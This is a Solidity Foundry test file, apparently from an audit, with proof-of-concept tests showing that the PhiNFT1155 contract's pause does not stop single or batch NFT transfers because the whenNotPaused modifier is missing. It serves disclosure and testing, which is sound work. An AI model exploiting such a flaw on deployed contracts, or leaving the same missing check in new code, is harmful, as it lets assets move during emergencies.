// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.25;

import { PRBTest } from "@prb/test/src/PRBTest.sol";
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

import { Settings } from "../helpers/Settings.sol";
import { IPhiFactory } from "../../src/interfaces/IPhiFactory.sol";
import { IPhiNFT1155 } from "../../src/interfaces/IPhiNFT1155.sol";
import { PhiNFT1155 } from "../../src/art/PhiNFT1155.sol";
import { ECDSA } from "solady/utils/ECDSA.sol";
import { LibZip } from "solady/utils/LibZip.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating that the pausing mechanism in PhiNFT1155 doesn't prevent NFT transfers
 *
 * VULNERABILITY DESCRIPTION:
 * The PhiNFT1155 contract inherits from PausableUpgradeable but fails to apply the
 * whenNotPaused modifier to the safeTransferFrom and safeBatchTransferFrom functions.
 * This allows users to transfer NFTs even when the contract is paused, defeating the
 * purpose of the pause mechanism.
 *
 * ATTACK SCENARIO:
 * 1. Owner pauses the contract (expecting all operations to stop)
 * 2. User can still transfer their NFTs to other addresses
 * 3. The pause mechanism is ineffective for transfers
 *
 * EXPECTED BEHAVIOR:
 * When the contract is paused, all transfer operations should revert
 *
 * ACTUAL BEHAVIOR:
 * Transfers succeed even when the contract is paused
 */
contract ExploitTest is Settings {
    string ART_ID_URL_STRING;
    string IMAGE_URL;
    uint256 expiresIn;
    address attacker;
    address victim;

    function setUp() public override {
        super.setUp();

        ART_ID_URL_STRING = "test-art-id-123";
        IMAGE_URL = "https://example.com/image.png";
        expiresIn = START_TIME + 100;

        // Setup attacker and victim addresses
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        vm.deal(attacker, 10 ether);
        vm.deal(victim, 10 ether);

        // Create a credential for testing
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.warp(START_TIME + 1);
    }

    function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;

        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
    }

    function _createArt(string memory artIdUrl_) internal {
        bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
        bytes memory signCreateData = abi.encode(expiresIn, artIdUrl_, credData);
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        IPhiFactory.CreateConfig memory config =
            IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
        phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);
    }

    function _claimArt(address minter, uint256 artId) internal {
        bytes32 advanced_data = bytes32("1");
        bytes memory signData = abi.encode(expiresIn, minter, referrer, verifier, artId, block.chainid, advanced_data);
        bytes32 claimMsgHash = keccak256(signData);
        bytes32 claimDigest = ECDSA.toEthSignedMessageHash(claimMsgHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, claimDigest);
        if (v != 27) s = s | bytes32(uint256(1) << 255);
        bytes memory signature = abi.encodePacked(r, s);

        bytes memory data =
            abi.encode(artId, minter, referrer, verifier, expiresIn, uint256(1), advanced_data, IMAGE_URL, signature);
        bytes memory dataCompressed = LibZip.cdCompress(data);
        uint256 totalMintFee = phiFactory.getArtMintFee(artId, 1);

        vm.prank(minter);
        phiFactory.claim{ value: totalMintFee }(dataCompressed);
    }

    /**
     * @notice PoC: Demonstrates that NFT transfers work even when contract is paused
     *
     * EXPLOIT STEPS:
     * 1. Create an art and mint an NFT to the attacker
     * 2. Verify attacker owns the NFT (balance = 1)
     * 3. Owner pauses the PhiNFT1155 contract
     * 4. Verify contract is paused
     * 5. EXPLOIT: Attacker transfers NFT to victim despite contract being paused
     * 6. Verify transfer succeeded (attacker balance = 0, victim balance = 1)
     *
     * IMPACT:
     * The pause mechanism is completely ineffective for transfers. If the owner
     * pauses the contract due to a security issue or emergency, users can still
     * transfer NFTs, potentially allowing attackers to move stolen assets or
     * continue malicious activities.
     */
    function test_PauseDoesNotPreventTransfers() public {
        console2.log("=== PoC: Pausing mechanism doesn't prevent NFT transfers ===");

        // Step 1: Create art and mint NFT to attacker
        console2.log("\n[Step 1] Creating art and minting NFT to attacker...");
        _createArt(ART_ID_URL_STRING);
        uint256 artId = 1;
        _claimArt(attacker, artId);

        // Get the PhiNFT1155 contract address
        address nftAddress = phiFactory.getArtAddress(artId);
        PhiNFT1155 nftContract = PhiNFT1155(payable(nftAddress));
        uint256 tokenId = nftContract.getTokenIdFromFactoryArtId(artId);

        // Step 2: Verify attacker owns the NFT
        uint256 attackerBalanceBefore = nftContract.balanceOf(attacker, tokenId);
        uint256 victimBalanceBefore = nftContract.balanceOf(victim, tokenId);
        console2.log("Attacker balance before:", attackerBalanceBefore);
        console2.log("Victim balance before:", victimBalanceBefore);
        assertEq(attackerBalanceBefore, 1, "Attacker should own 1 NFT");
        assertEq(victimBalanceBefore, 0, "Victim should own 0 NFTs");

        // Step 3: PhiFactory (owner of NFT contract) pauses the contract
        console2.log("\n[Step 2] PhiFactory owner pauses the PhiNFT1155 contract...");
        // The PhiNFT1155 contract's owner is the PhiFactory, so we need to use PhiFactory's owner
        address nftOwner = nftContract.owner();
        console2.log("NFT contract owner:", nftOwner);
        vm.prank(nftOwner);
        nftContract.pause();

        // Step 4: Verify contract is paused
        bool isPaused = nftContract.paused();
        console2.log("Contract paused:", isPaused);
        assertTrue(isPaused, "Contract should be paused");

        // Step 5: EXPLOIT - Attacker transfers NFT despite contract being paused
        console2.log("\n[Step 3] EXPLOIT: Attacker transfers NFT while contract is paused...");
        vm.prank(attacker);
        nftContract.safeTransferFrom(attacker, victim, tokenId, 1, "");

        // Step 6: Verify transfer succeeded
        uint256 attackerBalanceAfter = nftContract.balanceOf(attacker, tokenId);
        uint256 victimBalanceAfter = nftContract.balanceOf(victim, tokenId);
        console2.log("\n[Step 4] Verifying exploit success...");
        console2.log("Attacker balance after:", attackerBalanceAfter);
        console2.log("Victim balance after:", victimBalanceAfter);

        // VULNERABILITY PROOF: Transfer succeeded even though contract is paused
        assertEq(attackerBalanceAfter, 0, "Attacker should have 0 NFTs after transfer");
        assertEq(victimBalanceAfter, 1, "Victim should have 1 NFT after transfer");

        console2.log("\n=== VULNERABILITY CONFIRMED ===");
        console2.log("NFT was successfully transferred while contract was paused!");
        console2.log("The pause mechanism is ineffective for transfers.");
    }

    /**
     * @notice PoC: Demonstrates that batch transfers also work when contract is paused
     *
     * This test shows that the vulnerability also affects safeBatchTransferFrom,
     * allowing users to transfer multiple NFTs in a single transaction while paused.
     */
    function test_PauseDoesNotPreventBatchTransfers() public {
        console2.log("=== PoC: Pausing mechanism doesn't prevent batch NFT transfers ===");

        // Step 1: Create multiple arts and mint NFTs to attacker
        console2.log("\n[Step 1] Creating arts and minting NFTs to attacker...");
        _createArt(ART_ID_URL_STRING);
        _createArt("test-art-id-456");

        uint256 artId1 = 1;
        uint256 artId2 = 2;

        _claimArt(attacker, artId1);
        _claimArt(attacker, artId2);

        // Get the PhiNFT1155 contract address
        address nftAddress = phiFactory.getArtAddress(artId1);
        PhiNFT1155 nftContract = PhiNFT1155(payable(nftAddress));

        uint256 tokenId1 = nftContract.getTokenIdFromFactoryArtId(artId1);
        uint256 tokenId2 = nftContract.getTokenIdFromFactoryArtId(artId2);

        // Prepare batch transfer arrays
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = tokenId1;
        tokenIds[1] = tokenId2;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1;
        amounts[1] = 1;

        // Step 2: Verify attacker owns both NFTs
        console2.log("Attacker balance (token 1) before:", nftContract.balanceOf(attacker, tokenId1));
        console2.log("Attacker balance (token 2) before:", nftContract.balanceOf(attacker, tokenId2));
        assertEq(nftContract.balanceOf(attacker, tokenId1), 1, "Attacker should own NFT 1");
        assertEq(nftContract.balanceOf(attacker, tokenId2), 1, "Attacker should own NFT 2");

        // Step 3: PhiFactory (owner of NFT contract) pauses the contract
        console2.log("\n[Step 2] PhiFactory owner pauses the PhiNFT1155 contract...");
        address nftOwner = nftContract.owner();
        vm.prank(nftOwner);
        nftContract.pause();
        assertTrue(nftContract.paused(), "Contract should be paused");

        // Step 4: EXPLOIT - Attacker batch transfers NFTs despite contract being paused
        console2.log("\n[Step 3] EXPLOIT: Attacker batch transfers NFTs while contract is paused...");
        vm.prank(attacker);
        nftContract.safeBatchTransferFrom(attacker, victim, tokenIds, amounts, "");

        // Step 5: Verify batch transfer succeeded
        console2.log("\n[Step 4] Verifying exploit success...");
        console2.log("Victim balance (token 1) after:", nftContract.balanceOf(victim, tokenId1));
        console2.log("Victim balance (token 2) after:", nftContract.balanceOf(victim, tokenId2));

        // VULNERABILITY PROOF: Batch transfer succeeded even though contract is paused
        assertEq(nftContract.balanceOf(attacker, tokenId1), 0, "Attacker should have 0 of NFT 1");
        assertEq(nftContract.balanceOf(attacker, tokenId2), 0, "Attacker should have 0 of NFT 2");
        assertEq(nftContract.balanceOf(victim, tokenId1), 1, "Victim should have 1 of NFT 1");
        assertEq(nftContract.balanceOf(victim, tokenId2), 1, "Victim should have 1 of NFT 2");

        console2.log("\n=== VULNERABILITY CONFIRMED ===");
        console2.log("Batch transfer succeeded while contract was paused!");
        console2.log("The pause mechanism is ineffective for batch transfers.");
    }
}
